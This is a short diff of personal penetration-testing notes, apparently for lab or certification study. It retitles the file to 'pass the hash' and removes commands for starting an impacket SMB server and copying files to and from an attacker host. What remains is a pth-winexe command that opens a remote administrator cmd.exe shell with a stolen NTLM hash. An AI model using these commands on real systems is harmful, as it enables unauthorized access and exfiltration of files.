@@ -1,14 +1,8 @@
-# windows priv esc
+# pass the hash
 
-## easy smb share
-
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
-copy \\<lhost>\kali\<some-file> C:\PrivEsc\<some-file>
-copy C:\PrivEsc\<some-file> \\<lhost>\kali\<some-file>
-
-## pass the hash
-
+```
 pth-winexe -U 'administrator%lmhash:ntlmhash' //$rhost cmd.exe
+```
 
 ## service
 
